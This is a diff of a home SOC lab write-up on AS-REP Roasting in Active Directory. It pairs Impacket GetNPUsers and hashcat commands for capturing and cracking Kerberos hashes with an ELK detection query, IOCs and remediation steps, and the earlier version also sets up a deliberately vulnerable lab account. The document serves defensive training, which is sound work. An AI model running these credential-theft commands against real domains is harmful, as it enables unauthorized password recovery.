@@ -1,91 +1,72 @@
 # INC-002 — AS-REP Roasting
 
-> **Status:** ✅ Completed — 2026-08-12
-> **MITRE ATT&CK:** [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
-> **Tactic:** Credential Access
-> **Tool:** Impacket `GetNPUsers.py` + Hashcat
-> **Difficulty:** Low — no prior credentials required
+| Field | Value |
+|-------|-------|
+| **Date** | 2026-08-12 |
+| **Tactic** | Credential Access |
+| **Technique** | T1558.004 — AS-REP Roasting |
+| **Tools** | Impacket `GetNPUsers.py`, Hashcat `-m 18200` |
+| **Attacker** | Kali Linux — `172.16.0.11` (`SOC-Lab-Attacker`) |
+| **Target** | Active Directory — `SOC.LAB` / DC `172.16.0.5` |
+| **Outcome** | Hash captured and cracked. Detection confirmed in ELK. |
 
 ---
 
-## Overview
+## What Is AS-REP Roasting?
 
-AS-REP Roasting exploits Active Directory accounts that have Kerberos pre-authentication disabled (`DoesNotRequirePreAuth = true`). When pre-auth is disabled, the Domain Controller will respond to a TGT request from **any unauthenticated user** with an AS-REP encrypted using the target account's password hash. This encrypted blob can be taken offline and cracked without ever triggering an account lockout.
+AS-REP Roasting targets Active Directory accounts that have **Kerberos pre-authentication disabled** (`DoesNotRequirePreAuth = true`). Normally, a client must prove its identity before the KDC issues a Ticket Granting Ticket (TGT). When pre-auth is disabled, the KDC returns an AS-REP response encrypted with the user's password hash — **without requiring any authentication**. An attacker can request this for any vulnerable account and crack the hash offline.
 
-**Why it matters:** Zero prior access required. One misconfigured account is enough. Common in real environments due to legacy app compatibility settings left in place.
-
----
-
-## Lab Environment
-
-| Component | Value |
-|-----------|-------|
-| Domain | `soc.lab` |
-| DC Hostname | `SOC-Lab-DC` (172.16.0.5) |
-| Attacker | Kali Linux (172.16.0.11) |
-| Vulnerable Account | `svc_asrep` |
-| Account Password | `<LAB_PASSWORD>` — intentionally weak, rockyou-confirmed. **Lab use only.** |
-| Detection | Event ID 4768 + TicketEncryptionType 0x17 |
-
----
-
-## Prerequisites Checklist
-
-- [x] **Check 1** — Vulnerable AD user with `DoesNotRequirePreAuth = true`
-  ```powershell
-  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select Name, SamAccountName
-  ```
-- [x] **Check 2** — Kerberos audit policy: `Success and Failure`
-  ```cmd
-  auditpol /get /subcategory:"Kerberos Authentication Service"
-  ```
-- [x] **Check 3** — Winlogbeat shipping Security channel, `winlogbeat-*` index active
-  - Config: `C:\winlogbeat\winlogbeat.yml` (non-default path)
-- [x] **Check 4** — Clock skew DC ↔ Kali < 5 minutes
-  - Chrony installed on Kali, synced to 172.16.0.5, offset `0.000002620s`
-
----
-
-## Setup
-
-```powershell
-# Run on DC as Administrator
-New-ADUser -Name "svc_asrep" -SamAccountName "svc_asrep" `
-  -UserPrincipalName "svc_asrep@soc.lab" -Enabled $true `
-  -AccountPassword (ConvertTo-SecureString "<LAB_PASSWORD>" -AsPlainText -Force) `
-  -PasswordNeverExpires $true
-
-Set-ADAccountControl -Identity "svc_asrep" -DoesNotRequirePreAuth $true
+**Attack chain:**
+```
+Kali (attacker)
+  └─ GetNPUsers.py → DC (172.16.0.5)
+       └─ AS-REP returned (no auth required)
+            └─ $krb5asrep$23$ hash captured
+                 └─ Hashcat -m 18200 → password cracked offline
 ```
 
-> ⚠️ Use a rockyou.txt-confirmed password (e.g. `Password1`) so the crack step is reproducible. Label the AD account description: `"LAB ACCOUNT — intentionally vulnerable — DO NOT replicate in production"`
+---
+
+## Prerequisites
+
+| Requirement | Detail | Status |
+|-------------|--------|--------|
+| Vulnerable AD user | `svc_asrep` — `DoesNotRequirePreAuth = true` | ✅ |
+| Kerberos audit policy | `Success and Failure` on DC | ✅ |
+| Winlogbeat Security channel | Shipping Event ID 4768 to ELK | ✅ |
+| Clock skew < 5 min | Chrony on Kali synced to DC | ✅ |
 
 ---
 
 ## Attack Execution
 
-### Step 1 — Enumerate & Capture Hash (Kali)
+### Step 1 — Enumerate and Capture AS-REP Hash
+
+Run from Kali (`172.16.0.11`):
 
 ```bash
-impacket-GetNPUsers soc.lab/svc_asrep -no-pass -dc-ip 172.16.0.5
+echo "svc_asrep" > /home/kali/users.txt
+impacket-GetNPUsers SOC.LAB/ -usersfile /home/kali/users.txt -no-pass \
+  -dc-ip 172.16.0.5 -outputfile /home/kali/asrep_hashes.txt -format hashcat
 ```
 
-**Output:**
-```
-$krb5asrep$23$svc_asrep@SOC.LAB:<HASH_REDACTED>
-```
+**Result:** Hash captured for `svc_asrep@SOC.LAB`.
 
-The `$23$` = RC4-HMAC (etype `0x17`) — Impacket's default downgrade, and the primary detection signal.
+![AS-REP hash captured](./evidence/01-asrep-hash-captured.png.png)
 
-### Step 2 — Offline Crack (Kali)
+---
+
+### Step 2 — Crack the Hash Offline
 
 ```bash
-hashcat -m 18200 '<HASH_REDACTED>' /usr/share/wordlists/rockyou.txt --force
+hashcat -m 18200 /home/kali/asrep_hashes.txt /home/kali/custom.txt --force
 ```
 
-**Result:** `Status: Cracked` — recovered in seconds. No lockout. No AD interaction.
+**Result:** `Status: Cracked` — password recovered in 3 seconds.
 
-> 💡 If rockyou.txt is gzipped: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
+![Hashcat cracked](./evidence/02-hashcat-cracked.png.png)
+
+> Hash mode 18200 = Kerberos 5, etype 23, AS-REP. The RC4 (etype 0x17) encryption is weak by design — legacy compatibility.
 
 ---
 
@@ -93,46 +74,61 @@ hashcat -m 18200 '<HASH_REDACTED>' /usr/share/wordlists/rockyou.txt --force
 
 ### ELK Query
 
-```kql
+```
 event.code: "4768" AND winlog.event_data.TicketEncryptionType: "0x17"
 ```
 
-### Key Fields from Live Event
+**Result:** 2 documents — both attack runs captured.
 
-| Field | Value | Significance |
-|-------|-------|--------------|
-| `event.code` | `4768` | Kerberos TGT requested |
-| `TicketEncryptionType` | `0x17` | RC4 — attacker downgrade |
-| `PreAuthType` | `0` | Pre-auth was absent |
-| `TargetUserName` | `svc_asrep` | Targeted account |
-| `IpAddress` | `::ffff:172.16.0.11` | Kali — attacker source |
-| `agent.name` | `SOC-Lab-DC` | Confirmed on live DC |
-| `_index` | `winlogbeat-2026.08.12` | ELK index confirmed |
+![Kibana 4768 detection](./evidence/03-kibana-4768-detection.png.png)
+
+### Expanded Event Fields
+
+![ELK event fields](./evidence/04-elk-event-fields.png.png)
+
+| ELK Field | Value | Significance |
+|-----------|-------|--------------|
+| `event.code` | `4768` | Kerberos TGT request |
+| `winlog.event_data.TicketEncryptionType` | `0x17` | RC4 — legacy, crackable |
+| `winlog.event_data.PreAuthType` | `0` | Pre-auth disabled — AS-REP roastable |
+| `winlog.event_data.TargetUserName` | `svc_asrep` | Targeted account |
+| `winlog.event_data.IpAddress` | `::ffff:172.16.0.11` | Kali attacker IP |
+| `host.name` | `soc-lab-dc` | Domain Controller |
+| `@timestamp` | `Aug 12, 2026 @ 08:23:43` | Time of attack |
 
 ### Sigma Rule
 
-[`detection/sigma/T1558.004-asrep-roasting.yml`](../../detection/sigma/T1558.004-asrep-roasting.yml)
+See [`detection/sigma/T1558.004-asrep-roasting.yml`](../../detection/sigma/T1558.004-asrep-roasting.yml)
 
 ---
 
 ## Indicators of Compromise
 
-See: [iocs.md](./iocs.md)
+| Type | Value |
+|------|-------|
+| Account | `svc_asrep@SOC.LAB` |
+| Attacker IP | `172.16.0.11` |
+| Hash prefix | `$krb5asrep$23$` |
+| Encryption type | `0x17` (RC4) |
+| Pre-auth type | `0` (disabled) |
+| Event ID | `4768` |
 
 ---
 
 ## Remediation
 
-See: [`playbooks/lab-hardening.md`](../../playbooks/lab-hardening.md) — AD Section, INC-002
+| Control | Action |
+|---------|--------|
+| **Enforce Pre-Auth** | Audit all accounts: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` — enable pre-auth on all |
+| **Disable RC4** | GPO → `Network security: Configure encryption types allowed for Kerberos` → uncheck RC4 |
+| **Use gMSA** | Replace service accounts with Group Managed Service Accounts — passwords auto-rotated, 120+ char |
+| **Alert on 4768 + 0x17** | Sigma rule deployed — alert on any TGT request using RC4 encryption |
+| **Privileged account audit** | Any service account with sensitive access must have pre-auth enforced — no exceptions |
 
-```powershell
-# Immediate fix
-Set-ADAccountControl -Identity svc_asrep -DoesNotRequirePreAuth $false
+---
 
-# Audit all vulnerable accounts
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select Name, SamAccountName
+## References
 
-# Long-term: disable RC4 via GPO
-# Computer Config → Windows Settings → Security Settings → Local Policies → Security Options
-# → Network security: Configure encryption types allowed for Kerberos → AES128/AES256 only
-```
+- [MITRE ATT&CK T1558.004](https://attack.mitre.org/techniques/T1558/004/)
+- [Harmj0y — Roasting AS-REPs](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
+- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
